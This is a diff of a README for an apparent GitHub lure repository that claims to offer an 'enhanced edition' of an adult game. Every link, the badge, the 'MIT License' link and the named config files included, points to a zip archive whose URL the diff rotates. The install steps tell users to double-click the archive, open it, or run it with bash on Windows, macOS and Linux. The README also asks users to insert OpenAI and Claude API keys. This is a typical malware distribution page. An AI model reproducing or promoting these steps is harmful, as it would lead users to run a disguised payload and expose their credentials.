@@ -1,6 +1,6 @@
 # Saintess Eruna and the Lustful Book of Corruption Busty Sisters H Services Enhanced Edition
 
-[![Download](https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip%20Eruna%20Enhanced%https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip)](https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip)
+[![Download](https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip%20Eruna%20Enhanced%https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip)](https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Our tome doesn't stand alone – it communes with the realms beyond:
 - **Claude API Support**: Access Claude’s narrative and conversational prowess, unveiling dynamic content personalization.
 
 API setup instructions:
-1. After download (https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip), locate the `https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip` file in the root directory.
+1. After download (https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip), locate the `https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip` file in the root directory.
 2. Insert your OpenAI API key and Claude API key.
 3. Save and restart your journey for the magic to begin.
 
@@ -72,15 +72,15 @@ The **Saintess Eruna Enhanced Edition** is more than a repository – it’s a d
 
 Ready to unlock the power of Saintess Eruna? Embark as follows whenever the call to download appears:
 
-1. **Click the mystical badge** at the top or bottom of this README (https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip).
+1. **Click the mystical badge** at the top or bottom of this README (https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip).
 2. **Download** the appropriate release for your operating system.
 3. **Extract** the sacred contents to your preferred directory.
 4. **Run the installer or startup script** corresponding to your system:
-    - On Windows: Double-click `https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip`
-    - On macOS: Open `https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip`
-    - On Linux: Run `bash https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip`
+    - On Windows: Double-click `https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip`
+    - On macOS: Open `https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip`
+    - On Linux: Run `bash https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip`
     - On Android/iOS: Follow on-screen installation steps after opening the app package.
-5. **Set up API keys** in the provided `https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip` for AI-powered features.
+5. **Set up API keys** in the provided `https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip` for AI-powered features.
 6. **Commence your adventure** and enjoy!
 
 ---
@@ -95,11 +95,11 @@ This repository operates as an interpretive, fan-driven digital archive. All cre
 
 This repository is protected under the **MIT License (2025)**. You are free to weave, adapt, and distribute the code enchanted here, provided you include appropriate notices. Relive, remix, and contribute to this magical adventure.
 
-[Read the full MIT License](https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip)
+[Read the full MIT License](https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip%20Eruna%20Enhanced%https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip)](https://raw.githubusercontent.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/branch/disquietedly/saintess-eruna-lustful-book-busty-sisters-h-edition-v3.4.zip)
+[![Download](https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip%20Eruna%20Enhanced%https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip)](https://github.com/ZukoChris/saintess-eruna-lustful-book-busty-sisters-h-edition/raw/refs/heads/branch/disquietedly/sisters_h_edition_eruna_busty_saintess_lustful_book_v2.3-alpha.5.zip)
 
 ---
 
